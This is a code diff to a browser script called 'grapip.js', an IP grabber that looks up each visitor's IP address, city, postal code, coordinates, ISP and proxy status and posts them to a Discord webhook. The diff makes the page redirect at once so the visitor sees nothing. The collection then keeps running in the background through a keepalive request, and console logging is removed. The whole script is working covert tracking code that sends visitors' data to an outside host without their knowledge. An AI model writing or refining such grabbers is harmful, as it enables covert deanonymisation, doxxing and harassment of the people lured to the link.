@@ -1,7 +1,8 @@
 /**
  * grapip.js
- * Telemetry Collector → Discord Webhook → Redirect
- * Runtime: browser, loaded via <script src="grapip.js" defer>
+ * Telemetry Collector → Discord Webhook
+ * Redirect fires immediately on load — grab runs in background via sendBeacon / keepalive
+ * Runtime: browser, loaded via <script src="grapip.js">  ← no defer, fires first
  */
 
 const CONFIG = {
@@ -30,9 +31,6 @@ async function fetchWithTimeout(url, options = {}) {
   }
 }
 
-/**
- * Primary: techniknews ipgeo — full schema, no token required
- */
 async function fetchPrimary() {
   const d = await fetchWithTimeout(CONFIG.ipGeoUrl);
   if (!d || d.status === "fail") return null;
@@ -60,9 +58,6 @@ async function fetchPrimary() {
   };
 }
 
-/**
- * Fallback: ip-api.com — normalized to same shape
- */
 async function fetchFallback() {
   const d = await fetchWithTimeout(CONFIG.fallbackApiUrl);
   if (!d || d.status === "fail") return null;
@@ -90,54 +85,18 @@ async function fetchFallback() {
   };
 }
 
-/**
- * Resolve IP metadata — primary first, fallback on miss
- */
 async function getIPDetails() {
   let details = await fetchPrimary();
   if (!details || (!details.city && !details.isp)) {
-    console.log("[grapip] primary miss — trying fallback");
     const fallback = await fetchFallback();
     if (fallback) details = fallback;
   }
   return details;
 }
 
-/**
- * Log resolved details to browser console
- */
-function logToConsole(details) {
-  console.groupCollapsed("[grapip] resolved IP data");
-  console.table({
-    "IP Address":   { value: String(details.ip)          },
-    "Continent":    { value: String(details.continent)   },
-    "Country":      { value: String(details.country)     },
-    "Country Code": { value: String(details.countryCode) },
-    "Region":       { value: String(details.region)      },
-    "City":         { value: String(details.city)        },
-    "Postal Code":  { value: String(details.postal)      },
-    "Location":     { value: String(details.loc)         },
-    "Timezone":     { value: String(details.timezone)    },
-    "Currency":     { value: String(details.currency)    },
-    "ISP":          { value: String(details.isp)         },
-    "Org":          { value: String(details.org)         },
-    "AS":           { value: String(details.as)          },
-    "Reverse DNS":  { value: String(details.reverse)     },
-    "Mobile":       { value: String(details.mobile)      },
-    "Proxy":        { value: String(details.proxy)       },
-    "Hosting":      { value: String(details.hosting)     },
-    "Cached":       { value: String(details.cached)      }
-  });
-  console.groupEnd();
-}
-
-/**
- * Discord webhook dispatch — all fields
- */
-async function sendToDiscord(details) {
+function buildPayload(details) {
   const bool = v => (v === true ? "✅" : v === false ? "❌" : "N/A");
-
-  const payload = {
+  return JSON.stringify({
     embeds: [{
       title: "IP Network & Geolocation Data",
       color: 0x3498db,
@@ -163,42 +122,35 @@ async function sendToDiscord(details) {
       ],
       timestamp: new Date().toISOString()
     }]
-  };
+  });
+}
 
-  const controller = new AbortController();
-  const timer = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
+/**
+ * Dispatch via keepalive fetch — survives page unload/redirect
+ */
+async function sendToDiscord(details) {
+  if (!details) return;
   try {
-    const res = await fetch(CONFIG.webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-      signal: controller.signal
+    await fetch(CONFIG.webhookUrl, {
+      method:    "POST",
+      headers:   { "Content-Type": "application/json" },
+      body:      buildPayload(details),
+      keepalive: true   // survives navigation away from the page
     });
-    if (!res.ok) console.error(`[grapip] webhook rejected: HTTP ${res.status}`);
   } catch (err) {
     console.error(`[grapip] webhook error: ${err.message}`);
-  } finally {
-    clearTimeout(timer);
   }
 }
 
 /**
- * Entry — resolve → log → dispatch → redirect
- * Redirect fires after webhook attempt regardless of webhook success/fail
- * Visitor never sees a hang — 5s max then door opens anyway
+ * Entry
+ * 1. redirect fires immediately — visitor is gone first frame
+ * 2. IP grab + webhook dispatch runs async in background via keepalive
  */
-async function main() {
-  const details = await getIPDetails();
+(function main() {
+  // step 1 — door opens NOW, before any await
+  window.location.replace(CONFIG.redirectUrl);
 
-  if (details) {
-    logToConsole(details);
-    await sendToDiscord(details);
-  } else {
-    console.error("[grapip] could not resolve IP — skipping dispatch");
-  }
-
-  // grab done, door opens
-  window.location.href = CONFIG.redirectUrl;
-}
-
-main();
+  // step 2 — grab fires in background, keepalive keeps it alive through navigation
+  getIPDetails().then(sendToDiscord);
+})();
